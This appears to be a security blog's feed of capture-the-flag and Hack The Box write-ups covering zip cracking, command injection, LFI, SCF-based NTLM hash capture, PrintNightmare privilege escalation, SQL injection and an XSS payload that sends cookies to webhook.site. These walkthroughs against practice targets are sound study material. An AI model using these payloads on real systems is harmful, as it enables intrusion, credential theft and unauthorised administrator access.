<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="https://darrynbrownfield.co.uk/tag/ctf/feed.xml" rel="self" type="application/atom+xml" />
  <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
  <updated>2022-03-12T16:06:52+00:00</updated>
  <id>https://darrynbrownfield.co.uk/tag/ctf/feed.xml</id>

  
  
  

  
    <title type="html">Darryn Brownfield | </title>
  

  
    <subtitle>Infosec | Hacking | CTF</subtitle>
  

  

  
    
      
    
  

  
  

  
    <entry>
      <title type="html">Intigriti 1337UP CTF 2022</title>
      <link href="https://darrynbrownfield.co.uk/intigritictf" rel="alternate" type="text/html" title="Intigriti 1337UP CTF 2022" />
      <published>2022-03-12T00:00:00+00:00</published>
      <updated>2022-03-12T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/intigritictf</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/intigritictf">&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cover.gif&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;These are a few write ups from the 1337UP CTF hosted by [Intigriti]](https://www.intigriti.com). It was a 24 hour CTF so didn’t get as much time on it as I would have liked however it was still a lot of fun.&lt;/p&gt;

&lt;h1 id=&quot;mirage---misc&quot;&gt;Mirage - Misc&lt;/h1&gt;

&lt;p&gt;The link for the ‘Mirage’ challenge was https://mirage.ctf.intigriti.io/. There were no additional files with this challenge. Looking at the website was just a static page with no working links.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/mirage.png&quot; alt=&quot;mirage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I looked at /robots.txt and found a whole list of entries.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/miragerobots.png&quot; alt=&quot;miragerobots&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are a few entires that lead no where and a some are trolls, the important ones are:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;Disallow: /wordlists.txt
Disallow: /ok.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wget https://mirage.ctf.intigriti.io/wordlists.txt&lt;/code&gt; to download the wordlist to my machine. On /ok.txt is some text which includes ‘/uncclzrny.wct’ with a hint of using ROT.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/mirageok.png&quot; alt=&quot;mirageok&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I went over to &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; and used rot13 on the text. This provided the url ‘/happymeal.jpg’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cyberchefrot.png&quot; alt=&quot;cyberchefrot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This led to another page ‘HelpMeOut.txt’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/miragehelp.png&quot; alt=&quot;miragehelp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This page provides a link to a download. Again using wget I download the zip file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/miragedownload.png&quot; alt=&quot;miragedownload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The zip is password protected.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $unzip flag.zip 
Archive:  flag.zip
[flag.zip] flag.txt password: 
   skipping: flag.txt                incorrect password
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used zip2john to create a hash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $zip2john flag.zip &amp;gt; zip.john                                                                          
ver 1.0 efh 5455 efh 7875 flag.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=68, decmplen=56, crc=CC303849
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then use john to crack the hash with the word list downloaded earlier.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $john --wordlist=wordlists.txt zip.john 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Soeasypeasy214   (flag.zip/flag.txt)
1g 0:00:00:00 DONE (2022-03-11 20:32) 100.0g/s 15500p/s 15500c/s 15500C/s ##this will help you later..violent
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
┌─[daz@parrotos]─[~/Documents/1337UPCTF/Mirage]
└──╼ $unzip flag.zip 
Archive:  flag.zip
[flag.zip] flag.txt password: 
 extracting: flag.txt                
┌─[daz@parrotos]─[~/Documents/1337UPCTF/Mirage]
└──╼ $cat flag.txt 
1337UP{Wh4tAM3ss.txt.jpg.whyareyouputtingmethroughthis}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;traveler---web&quot;&gt;Traveler - Web&lt;/h1&gt;

&lt;p&gt;The link for the ‘Traveler’ challenge was https://traveller.ctf.intigriti.io/. There were no additional files with this challenge. Looking at the link its a travel agent based website.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/traveler.png&quot; alt=&quot;traveler&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Poking around the website I found a section to check availability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerinjection.png&quot; alt=&quot;travelerinjection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I sent the request to Burp and started fuzzing the pack name field.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerapi.png&quot; alt=&quot;travelerapi&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When submitting &lt;code class=&quot;highlighter-rouge&quot;&gt;Single'&lt;/code&gt;  an error was generated showing&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;An error occurred whilst executing: bash check.sh Couple’&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelererror.png&quot; alt=&quot;travelererror&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It doesn’t appear to be verifying user input so I should be able to just append bash commands to the syntax so I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;Single&amp;amp;ls&lt;/code&gt; because of the special character I URL encoded it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerls.png&quot; alt=&quot;travelerls&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It worked, so getting the flag was simple using the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;pack=Single%26%63%61%74%20%2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67%2e%74%78%74&amp;amp;submit=Submit&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;cat ../../../flag.txt&lt;/code&gt; URL encoded.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerflag.png&quot; alt=&quot;travelerflag&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;lovely-kitten-pictures-1---lovely-kitten-pictures&quot;&gt;Lovely Kitten Pictures 1 - Lovely Kitten Pictures&lt;/h1&gt;

&lt;p&gt;The link for the ‘Lovely Kitten Pictures 1’ challenge was https://lovelykittenpictures.ctf.intigriti.io/. No files were included as part of this challenge. Navigating to the website just showed a picture of a cat with an option to switch.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cats.png&quot; alt=&quot;cats&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I sent the requests through Burp and saw a request to ‘/pictures.php?path=assets/1.jpg’. That looks it could be vulnerable to an LFI (Local File Inclusion).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/catsassets.png&quot; alt=&quot;catsassets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I played around for a while trying the basics such as ../../../../flag.txt, ../../../../etc/passwd &amp;amp; etc but just got 404’s so decided to try ‘/pictures.php?path=pictures.php’ which if it worked would include the source code of the php file and I would be able to see how the request worked and it worked!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/catsflag.png&quot; alt=&quot;catsflag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Reading the code it looks like any file other than .jpg would return the contents of flag1.txt I look at the headers and the flag was included1.&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;==========================================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="intigriti" />
      
        <category term="ctf" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Driver Write Up</title>
      <link href="https://darrynbrownfield.co.uk/driver" rel="alternate" type="text/html" title="Driver Write Up" />
      <published>2022-02-27T00:00:00+00:00</published>
      <updated>2022-02-27T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/driver</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/driver">&lt;p&gt;&lt;img src=&quot;/assets/images/driver/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://app.hackthebox.com/machines/Driver&quot;&gt;Driver&lt;/a&gt; is a easy box from &lt;a href=&quot;https://hackthebox.com&quot;&gt;Hack The Box&lt;/a&gt;, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:20 GMT
Nmap scan report for 10.10.11.106
Host is up (0.020s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-28T00:20:49
|_  start_date: 2022-02-27T04:55:51

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;80 - HTTP - Microsoft IIS httpd 10.0&lt;/li&gt;
  &lt;li&gt;135 - MSRPC - Microsoft Windows RPC&lt;/li&gt;
  &lt;li&gt;445 - SMB - Microsoft Windows 7 - 10 microsoft-ds&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan and found winrm to be open on port 5985.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/all_ports 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:25 GMT
Nmap scan report for 10.10.11.106
Host is up (0.026s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The web service is showing an unauthorized response however it could be leaking a username with the message “Please enter password for admin”.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Before looking at the web service I tried enumerating SMB with various tools such as smbmap, smbclient and CrackMapExec however I had no joy.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cme smb 10.10.11.106
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
└──╼ $smbmap -H 10.10.11.106
[!] Authentication error on 10.10.11.106
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I turned my attention to the web service. Navigating to the IP I did get a login prompt. I tried admin:admin and got in!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/driver/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once logged in, I get a simple web page but an email address of ‘support@driver.htb’. I updated my host file with ‘driver.htb’ just in case I need it later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/driver/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The only link that works on the web page is ‘Firmware Updates’. This page provides an upload function. I played around with this for such a long time, trying attacks like XSS, uploading PHP shells but nothing worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/driver/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However re-reading the line:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I decided to change my google search to “http smb file share exploit” and found an article on using SCF files.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;The first article that returned was from Penetration testing lab https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/. After reading the article I created the file test.scf using the example they provide and changed the IP to my VPN IP.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat test.scf 
[Shell]
Command=2
IconFile=\\10.10.14.11\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I started responder with the command ‘&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo responder -I tun0&lt;/code&gt;’.&lt;/p&gt;

&lt;p&gt;Then uploaded the file using the web upload function and got a hit from responder&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:87ea6d299d14fa32:ED6355EFB0444E974805B3FF0E0B9B26:0101000000000000803021AB042CD801AE67B0D5B0D050060000000002000800350054003400480001001E00570049004E002D0
0350032003700430037004C004F004F0030004300360004003400570049004E002D00350032003700430037004C004F004F003000430036002E0035005400340048002E004C004F00430041004C000300140035005400340048002E004C004F004
30041004C000500140035005400340048002E004C004F00430041004C0007000800803021AB042CD80106000400020000000800300030000000000000000000000000200000C974CDC12A32C5BFD81B375A1DECF3BF2FF300E27CB3440A6AC953C
7F84AACEA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I put the hash in to a file called ‘hash’ and used hashcat to crack it with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now I had a username and password I was able to use winrm to login. To login I used &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;Evil-WinRM&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $/opt/evil-winrm/evil-winrm.rb -u tony -i 10.10.11.106
Enter Password: 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Now I had a foothold, I did some basic enumeration of the box. Looking at the running services I could see the Windows print spooler service.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;    381      23     5164      14448 ...12            1128 spoolsv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This made me think of the PrintNightmare exploit. I could also have used rpcdump to find this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $rpcdump.py 10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To exploit this I used the &lt;a href=&quot;https://github.com/calebstewart/CVE-2021-1675&quot;&gt;exploit&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/calebjstewart&quot;&gt;Caleb Stewart&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/_JohnHammond&quot;&gt;John Hammond&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I used git to clone the repo in to my /opt directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo git clone https://github.com/calebstewart/CVE-2021-1675.git
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (40/40), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
Receiving objects: 100% (40/40), 131.12 KiB | 932.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.
┌─[daz@parrotos]─[/opt]
└──╼ $cd CVE-2021-1675
┌─[daz@parrotos]─[/opt/CVE-2021-1675]
└──╼ $ls
CVE-2021-1675.ps1  nightmare-dll  README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now using Evil-WinRM I can upload the powershell script and execute it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1

                                                             
Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = &quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It worked! I canceled my current WinRM session and logged back in using the new credentials.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; exit

Info: Exiting with code 0

┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
└──╼ $/opt/evil-winrm/evil-winrm.rb -u adm1n -i 10.10.11.106
Enter Password: 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\adm1n\Documents&amp;gt; cd C:/Users/Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/26/2022   8:56 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats the box, thanks for reading!&lt;/p&gt;

&lt;p&gt;==========================================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="hackthebox" />
      
        <category term="ctf" />
      
        <category term="easy" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">HTB Cyber Santa CTF 2021 Web Write Up</title>
      <link href="https://darrynbrownfield.co.uk/htbcybersanta" rel="alternate" type="text/html" title="HTB Cyber Santa CTF 2021 Web Write Up" />
      <published>2021-12-05T00:00:00+00:00</published>
      <updated>2021-12-05T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/htbcybersanta</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/htbcybersanta">&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;This writeup is for the web challenges from the &lt;a href=&quot;https://www.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt; Cyber Santa is Coming to Town CTF that took place from Wednesday 01 December to Sunday 05 December.&lt;/p&gt;

&lt;p&gt;A big thank you to HTB for putting on a great event (as always). Check out their other CTF events at https://ctf.hackthebox.com.&lt;/p&gt;

&lt;h3 id=&quot;toy-workshop&quot;&gt;Toy Workshop&lt;/h3&gt;

&lt;p&gt;The description for this challenge was:&lt;/p&gt;

&lt;p&gt;“The work is going well on Santa’s toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?”&lt;/p&gt;

&lt;p&gt;The challenge had both a docker instance to active and downloadable content.&lt;/p&gt;

&lt;p&gt;Taking a look at the docker instance IP we get a simple web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/workshop.gif&quot; alt=&quot;workshop&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Rather than spend time poking around the website I took a look at the code provided.&lt;/p&gt;

&lt;p&gt;In the routes/index.js file provides some additional paths, ‘/api/submit’ and ‘/queries’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;router.get('/', (req, res) =&amp;gt; {
	return res.render('index');
});

router.post('/api/submit', async (req, res) =&amp;gt; {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() =&amp;gt; {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});

router.get('/queries', async (req, res, next) =&amp;gt; {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries =&amp;gt; {
			res.render('queries', { queries });
		})
		.catch(() =&amp;gt; res.status(500).send(response('Something went wrong!')));
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Two things jump out, the first the /api/submit page requires a POST request, if its accepted it will run ‘bot.readQueries(db);’. Next the /queries page is only accessible from 127.0.0.1.&lt;/p&gt;

&lt;p&gt;Taking a look at views/bot.js, the flag will be provided as a cookie and the readQueries function when called will set a cookie and call the queries page.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) =&amp;gt; {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next reviewing the views/queries.hbs page, It looks like the page iterates through the queries.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;        &amp;lt;p class=&quot;pb-3&quot;&amp;gt;Welcome back, admin!&amp;lt;/p&amp;gt;
        &amp;lt;div class=&quot;dash-frame&quot;&amp;gt;
            
            &amp;lt;p&amp;gt;}&amp;lt;/p&amp;gt;
            
            &amp;lt;p class=&quot;empty&quot;&amp;gt;No content&amp;lt;/p&amp;gt;
            
        &amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So putting all this together I think we can use XSS to grab the cookie by sending a XSS payload in the API submit function. The cookie (flag) will be sent and the readQueries function will call the queries page, the XSS payload will fire and give our flag.&lt;/p&gt;

&lt;p&gt;First I tested sending a simple POST request using curl and got a response.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -X POST http://:/api/submit --header 'Content-Type: application/json' -d '{&quot;query&quot;:&quot;test&quot;}'
{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used https://webhook.site to generate a URL I could use in the XSS payload. I then changed the payload to use a script tag to call the web hook site along with the cookie.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -X POST :/api/submit --header 'Content-Type: application/json' -d '{&quot;query&quot;:&quot;&amp;gt;&amp;lt;script&amp;gt;window.location='\''https://webho
ok.site//?c='\''.concat(document.cookie)&amp;lt;/script&amp;gt;&quot;}'
{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On the webhook site was my request and the cookie.&lt;/p&gt;

&lt;h3 id=&quot;toy-management&quot;&gt;Toy Management&lt;/h3&gt;

&lt;p&gt;The description for Toy Management was:&lt;/p&gt;

&lt;p&gt;“The evil elves have changed the admin access to Santa’s Toy Management Portal. Can you get the access back and save the Christmas?”&lt;/p&gt;

&lt;p&gt;Again with both a docker instance to start and downloadable content. This time its just a login form. I tried “admin’– -“ in the username field and “admin” as the password and got in and got the flag!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/toymanagement.png&quot; alt=&quot;toymanagement&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gadget-santa&quot;&gt;Gadget Santa&lt;/h3&gt;

&lt;p&gt;The description for Gadget Santa was:&lt;/p&gt;

&lt;p&gt;“It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?”&lt;/p&gt;

&lt;p&gt;Again this challenge had both a docker instance and downloadable content.&lt;/p&gt;

&lt;p&gt;Looking at the webpage, I appears I can select options to print output from the system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/gadgets.gif&quot; alt=&quot;gadgets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The URL has a command parameter: http://:/?command=list_storage&lt;/p&gt;

&lt;p&gt;So I tried some basic linux commands and I got output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/commands.gif&quot; alt=&quot;commands&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, when ever I try and use a space I get no output. I can chain commands together using &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; but it still fails to show an output if I use a space.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/listfiles.gif&quot; alt=&quot;listfiles&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the source, there is a sanitize function which removes spaces from the command.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?php
class MonitorModel
{   
    public function __construct($command)
    {
        $this-&amp;gt;command = $this-&amp;gt;sanitize($command);
    }

    public function sanitize($command)
    {   
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
